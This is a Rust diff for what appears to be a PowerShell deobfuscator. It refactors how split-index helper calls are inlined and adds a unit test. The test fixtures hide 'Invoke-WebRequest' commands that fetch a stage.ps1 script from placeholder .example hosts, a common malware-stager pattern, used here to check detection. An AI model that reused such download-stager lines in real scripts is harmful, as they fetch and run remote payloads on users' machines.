@@ -4000,6 +4000,7 @@ fn expand_literal_split_index_extractor_calls(text: &str) -> String {
                 sep_name: sep_var,
                 index_idx,
                 index_name: index_var,
+                arg_count: param_index.len(),
             };
             out = inline_ps_literal_split_index_calls(&out, &name, binding);
             continue;
@@ -6287,69 +6288,16 @@ fn inline_ps_literal_split_index_calls(
                     continue;
                 }
             }
-            let Some((first_end, first)) = parse_ps_literal_or_usize_arg(text, pos) else {
+            let Some((call_end, value, sep, index)) =
+                parse_ps_positional_literal_split_index_args(text, pos, parenthesized, binding)
+            else {
                 search_from = end_name;
                 continue;
             };
-            pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
-            let Some((second_end, second)) = parse_ps_literal_or_usize_arg(text, pos) else {
-                search_from = first_end;
-                continue;
-            };
-            pos = skip_ps_arg_separator(bytes, second_end, parenthesized);
-            let Some((third_end, third)) = parse_ps_literal_or_usize_arg(text, pos) else {
-                search_from = second_end;
-                continue;
-            };
-            let mut call_end = third_end;
-            if parenthesized {
-                let after = skip_ascii_ws(bytes, call_end);
-                if bytes.get(after) != Some(&b')') {
-                    search_from = third_end;
-                    continue;
-                }
-                call_end = after + 1;
-            }
-
-            let args = [first, second, third];
-            let Some(value) = args
-                .get(binding.value_idx)
-                .and_then(PsLiteralOrUsizeArg::as_str)
-            else {
+            let Some(replacement) = ps_literal_split_index_replacement(&value, &sep, index) else {
                 search_from = call_end;
                 continue;
             };
-            let Some(sep) = args
-                .get(binding.sep_idx)
-                .and_then(PsLiteralOrUsizeArg::as_str)
-            else {
-                search_from = call_end;
-                continue;
-            };
-            let Some(index) = args
-                .get(binding.index_idx)
-                .and_then(PsLiteralOrUsizeArg::as_usize)
-            else {
-                search_from = call_end;
-                continue;
-            };
-            if value.len() > 8192 {
-                search_from = call_end;
-                continue;
-            }
-            if sep.is_empty() {
-                search_from = call_end;
-                continue;
-            }
-            let Some(part) = value.split(sep).nth(index) else {
-                search_from = call_end;
-                continue;
-            };
-            if part.len() > 8192 {
-                search_from = call_end;
-                continue;
-            }
-            let replacement = format!("'{}'", part.replace('\'', "''"));
             matches.push((replace_start, call_end, replacement));
             search_from = call_end;
             match_count += 1;
@@ -6371,6 +6319,56 @@ struct PsSplitExtractorParamBinding<'a> {
     sep_name: &'a str,
     index_idx: usize,
     index_name: &'a str,
+    arg_count: usize,
+}
+
+fn parse_ps_positional_literal_split_index_args(
+    text: &str,
+    mut pos: usize,
+    parenthesized: bool,
+    binding: PsSplitExtractorParamBinding<'_>,
+) -> Option<(usize, String, String, usize)> {
+    if binding.arg_count == 0
+        || binding.arg_count > 8
+        || binding.value_idx >= binding.arg_count
+        || binding.sep_idx >= binding.arg_count
+        || binding.index_idx >= binding.arg_count
+    {
+        return None;
+    }
+
+    let bytes = text.as_bytes();
+    let mut value = None;
+    let mut sep = None;
+    let mut index = None;
+    let mut arg_end = pos;
+    for idx in 0..binding.arg_count {
+        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
+        if idx == binding.value_idx {
+            value = Some(arg.as_str()?.to_string());
+        }
+        if idx == binding.sep_idx {
+            sep = Some(arg.as_str()?.to_string());
+        }
+        if idx == binding.index_idx {
+            index = Some(arg.as_usize()?);
+        }
+        arg_end = next_end;
+        pos = next_end;
+        if idx + 1 < binding.arg_count {
+            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
+        }
+    }
+
+    if parenthesized {
+        let after = skip_ascii_ws(bytes, arg_end);
+        if bytes.get(after) != Some(&b')') {
+            return None;
+        }
+        arg_end = after + 1;
+    }
+
+    Some((arg_end, value?, sep?, index?))
 }
 
 fn inline_ps_named_literal_split_index_call(
@@ -10097,6 +10095,23 @@ Piece 1 '|' 'noise|Invoke-WebRequest -Uri https://ps-split-reordered.example/sta
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-split-reordered.example/stage.ps1'"),
             "reordered split-index extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_split_index_extractor_reordered_call_with_dummy_arg_is_rewritten() {
+        let text = r#"function Piece($unused,$value,$sep,$index) {
+  return $value.Split($sep)[$index]
+}
+Piece 0 'noise|Invoke-WebRequest -Uri https://ps-split-reordered-dummy.example/stage.ps1|tail' '|' 1"#;
+
+        let out = expand_literal_split_index_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-split-reordered-dummy.example/stage.ps1'"
+            ),
+            "reordered split-index extractor call with dummy arg was not rewritten:\n{out}"
         );
     }
 
